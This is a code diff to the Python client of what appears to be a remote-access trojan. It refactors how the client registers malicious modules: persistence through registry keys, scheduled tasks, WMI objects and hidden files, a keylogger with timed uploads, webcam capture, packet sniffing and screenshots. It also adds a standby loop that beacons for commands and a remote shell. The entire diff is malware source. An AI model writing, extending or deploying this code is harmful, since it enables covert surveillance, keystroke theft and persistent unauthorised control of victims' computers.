@@ -365,51 +365,53 @@ class Client(object):
         except Exception as e:
             return 'Error: {}'.format(str(e))
         return json.dumps(getattr(self, module).options, indent=2, separators=(',', ': '), sort_keys=True)
-    
-    def _command(fx, cmds=__command__):
-        __command__[fx.func_name] = fx
-        return fx
 
-    def _module(fx, cx=__command__, mx=__modules__):
+    def _command(fx, cx=__command__, mx=__modules__):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options   = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
             cx.update({fx.func_name: fx})
-
         elif fx.func_name is 'keylogger':
             fx.platforms = ['win32','darwin','linux2']
             fx.options   = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
             cx.update({fx.func_name: fx})
-
         elif fx.func_name is 'webcam':
             fx.platforms = ['win32']
             fx.options   = {'image': True, 'video': bool()}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
             cx.update({fx.func_name: fx})
-
         elif fx.func_name is 'packetsniff':
             fx.platforms = ['darwin','linux2']
             fx.options   = { 'next_upload': time.time() + 300.0, 'buffer': []}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
             cx.update({fx.func_name: fx})
-
         elif fx.func_name is 'screenshot':
             fx.platforms = ['win32','linux2','darwin']
             fx.options   = {}
             fx.status    = True if sys.platform in fx.platforms else False
             mx.update({fx.func_name: fx})
             cx.update({fx.func_name: fx})
-
+        elif fx.func_name is 'standby':
+            fx.platforms = ['win32','linux2','darwin']
+            fx.options   = {'next_run': time.time() + 300.0}
+            fx.status    = False
+            mx.update({fx.func_name: fx})
+            cx.update({fx.func_name: fx})
+        elif fx.func_name is 'shell':
+            fx.platforms = ['win32','linux2','darwin']
+            fx.options   = {}
+            fx.status    = True
+            mx.update({fx.func_name: fx})
+            cx.update({fx.func_name: fx})            
         else:
             __command__[fx.func_name] = fx
             cx.update({fx.func_name: fx})
-
         return fx
 
     def _options(self, *module):
@@ -561,14 +563,14 @@ class Client(object):
                 self._send(result, method=cmd)
 
     def _standby(self):
-        self.standby.next_run = time.time() + 300
         while True:
-            if self._mode:
-                if time.time() > self.standby.next_run:
+            if self.standby.status:
+                if time.time() > self.standby.options['next_run']:
                     self.run()
                 time.sleep(1)
                 b = self._receive()
-                self._mode = 0 if b else 1
+                if b and len(b):
+                    self._enable('shell')
             else:
                 break
         return self.shell()
@@ -1145,7 +1147,7 @@ class Client(object):
         """
         return self._help_modules()
 
-    @_module
+    @_command
     def webcam(self):
         """
         usage:          webcam
@@ -1153,7 +1155,7 @@ class Client(object):
         """
         return self._webcam()
     
-    @_module
+    @_command
     def keylogger(self):
         """
         usage:          keylogger
@@ -1161,7 +1163,7 @@ class Client(object):
         """
         return self._keylogger()
 
-    @_module
+    @_command
     def screenshot(self):
         """
         usage:          screenshot
@@ -1169,7 +1171,7 @@ class Client(object):
         """
         return self._screenshot()
 
-    @_module
+    @_command
     def persistence(self):
         """
         usage:          persistence
@@ -1177,7 +1179,7 @@ class Client(object):
         """
         return self._persistence()
     
-    @_module
+    @_command
     def packetsniff(self):
         """
         usage:          packetsniff
